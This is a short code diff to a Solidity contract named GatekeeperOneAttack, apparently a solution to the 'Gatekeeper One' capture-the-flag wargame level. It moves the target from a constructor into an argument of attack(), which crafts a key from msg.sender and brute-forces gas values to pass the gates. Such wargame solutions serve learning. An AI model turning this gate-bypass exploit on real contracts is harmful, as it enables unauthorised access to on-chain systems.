@@ -5,13 +5,7 @@ pragma solidity ^0.8.0;
 import "./interfaces/IGatekeeperOne.sol";
 
 contract GatekeeperOneAttack {
-    IGatekeeperOne private immutable victimGatekeeperOne;
-
-    constructor(IGatekeeperOne victimGatekeeperOne_) {
-        victimGatekeeperOne = victimGatekeeperOne_;
-    }
-
-    function attack() external {
+    function attack(IGatekeeperOne target) external {
         bytes8 key = bytes8(uint64(1 + type(uint32).max + uint16(uint160(msg.sender))));
         uint256 mod = 8191;
         uint256 gasBase = 5 * mod;
@@ -19,7 +13,7 @@ contract GatekeeperOneAttack {
 
         for (uint256 i = gasBase; i < gasLimit; ) {
             // solhint-disable no-empty-blocks
-            try victimGatekeeperOne.enter{ gas: i }(key) returns (bool res) {
+            try target.enter{ gas: i }(key) returns (bool res) {
                 if (res) break;
             } catch Error(string memory) {
                 // do nothing
@@ -35,6 +29,6 @@ contract GatekeeperOneAttack {
             }
         }
 
-        require(msg.sender == victimGatekeeperOne.entrant(), "GatekeeperOne: Attack failed");
+        require(msg.sender == target.entrant(), "GatekeeperOne: Attack failed");
     }
 }
